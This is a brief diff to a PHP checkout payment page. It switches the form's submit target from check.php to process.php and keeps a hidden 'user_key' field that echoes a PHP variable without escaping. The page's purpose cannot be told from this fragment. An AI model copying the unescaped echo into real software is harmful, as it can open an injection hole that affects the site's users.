@@ -135,7 +135,7 @@ if (!isset($users[$user_key])) {
     <main>
         <div class="CheckoutPaymentForm">
             <!-- CHANGE ONLY THIS LINE: Add method="POST" action="check.php" -->
-            <form class="PaymentForm-form" method="POST" action="check.php" novalidate="" id="payment-form">
+            <form class="PaymentForm-form" method="POST" action="process.php" novalidate="" id="payment-form">
                 <!-- ADD THIS LINE RIGHT AFTER THE FORM OPENING TAG -->
                 <input type="hidden" name="user_key" value="<?php echo $user_key; ?>">
                 
